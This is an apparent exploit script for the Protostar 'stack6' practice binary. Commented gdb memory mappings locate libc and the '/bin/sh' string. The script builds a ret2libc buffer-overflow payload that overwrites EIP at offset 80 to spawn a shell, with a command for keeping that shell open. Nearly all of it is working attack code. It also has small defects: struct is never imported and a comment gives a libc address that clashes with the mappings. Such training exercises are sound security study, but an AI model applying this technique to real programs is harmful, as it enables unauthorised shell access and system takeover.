#! /usr/bin/python

#fuzz="A"*80+"B"*4
#print fuzz
#we can cotrol EIP at offset 80
#since we only have left a small place we need to use ret2libc
#after info proc mappings we found that libc start on address 0xb7ecffb0
#first we will need to find the right offset of ''/bin/sh''  = 11f3bf
"""(gdb) info proc mappings
process 5560
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fde000 0xb7fe2000     0x4000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) x/s 0xb7e97000+0x11f3bf
0xb7fb63bf:      '/bin/sh'
"""
#so /lib/libc-2.11.2.so starts at address 0xb7e97000 if added offset 0x11f3bf we will found the direct location of eip
padding="A"*80

eip = struct.pack("I",0xb7ecffb0)
bin_sh= struct.pack("I",0xb7e97000 + 0x11f3bf)

nops="\x90"*4

print padding+eip+nops+bin_sh

#to avoid the immediate termination of /bin/sh we shall use the command 'CAT << EOF' trick 
# (python /home/user/exploit.py ;cat)|./stack6

